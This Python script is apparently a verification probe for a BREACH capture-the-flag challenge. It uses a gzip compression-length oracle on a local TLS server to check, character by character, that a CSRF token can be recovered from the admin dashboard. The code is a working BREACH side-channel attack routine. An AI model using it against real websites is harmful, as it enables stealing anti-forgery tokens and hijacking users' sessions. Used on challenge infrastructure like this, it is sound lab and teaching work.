"""
Determinism probe for the BREACH challenge.

Verifies, against the live server, that the 1-sample compression oracle works:
repeated identical probes give identical lengths, and at each position of the
CSRF token tail, the correct next hex char uniquely minimizes the response
length.

Env vars expected (copy from the server's stdout on startup):
  ADMIN_SESSION   session cookie of the admin user
  CSRF_TOKEN      the full CSRF token (to check our predictions)
"""
import os
import socket
import ssl
import string
import sys
import urllib.parse

SERVER_HOST = os.environ.get("SERVER_HOST", "127.0.0.1")
SERVER_PORT = int(os.environ.get("SERVER_PORT", "4443"))
ADMIN_SESSION = os.environ["ADMIN_SESSION"]
CSRF_TOKEN = os.environ.get("CSRF_TOKEN", "")

TOKEN_PREFIX = "csrf_token_"
ALPHA = string.hexdigits.lower()[:16]


def build_ssl_context() -> ssl.SSLContext:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_3
    ctx.maximum_version = ssl.TLSVersion.TLSv1_3
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def open_conn() -> ssl.SSLSocket:
    raw = socket.create_connection((SERVER_HOST, SERVER_PORT))
    return build_ssl_context().wrap_socket(raw, server_hostname=SERVER_HOST)


def http_request(sock: ssl.SSLSocket, method: str, path: str,
                 headers: dict, body: bytes = b"") -> int:
    """Send one HTTP/1.1 request; return bytes-on-wire of the response."""
    req = f"{method} {path} HTTP/1.1\r\n"
    for k, v in headers.items():
        req += f"{k}: {v}\r\n"
    req += "\r\n"
    sock.sendall(req.encode() + body)
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = sock.recv(65536)
        if not chunk:
            break
        buf += chunk
    header_end = buf.find(b"\r\n\r\n") + 4
    headers_bytes = buf[:header_end]
    content_length = 0
    for line in headers_bytes.split(b"\r\n"):
        if line.lower().startswith(b"content-length:"):
            content_length = int(line.split(b":", 1)[1].strip())
    body_bytes = buf[header_end:]
    while len(body_bytes) < content_length:
        chunk = sock.recv(65536)
        if not chunk:
            break
        body_bytes += chunk
    return len(headers_bytes) + content_length


def set_search(sock: ssl.SSLSocket, q: str) -> None:
    http_request(sock, "GET", "/search?" + urllib.parse.urlencode({"q": q}), {
        "Host": SERVER_HOST,
        "Connection": "keep-alive",
    })


def dashboard_len(sock: ssl.SSLSocket) -> int:
    return http_request(sock, "GET", "/dashboard", {
        "Host": SERVER_HOST,
        "Cookie": f"session={ADMIN_SESSION}",
        "Accept-Encoding": "gzip",
        "Connection": "keep-alive",
    })


def probe(sock: ssl.SSLSocket, guess: str) -> int:
    set_search(sock, guess)
    return dashboard_len(sock)


def main():
    sock = open_conn()

    # Sanity: repeated identical probe yields identical length.
    lens = [probe(sock, "AAAA") for _ in range(3)]
    print(f"repeat lengths: {lens} -> {'OK' if len(set(lens)) == 1 else 'NONDETERMINISTIC'}")

    if not CSRF_TOKEN:
        print("no CSRF_TOKEN env; skipping oracle test")
        return

    assert CSRF_TOKEN.startswith(TOKEN_PREFIX), "unexpected token format"
    tail = CSRF_TOKEN[len(TOKEN_PREFIX):]

    ok = 0
    bad = 0
    for pl in range(len(tail)):
        extracted = tail[:pl]
        correct = tail[pl]
        lengths = {ch: probe(sock, TOKEN_PREFIX + extracted + ch) for ch in ALPHA}
        min_len = min(lengths.values())
        winners = [ch for ch, n in lengths.items() if n == min_len]
        status = "OK" if winners == [correct] else "BAD"
        if status == "OK":
            ok += 1
        else:
            bad += 1
            print(f"pl={pl:2d} correct={correct} winners={winners} [{status}]")
    print(f"\nsummary: {ok} OK, {bad} BAD across {ok + bad} positions")


if __name__ == "__main__":
    main()
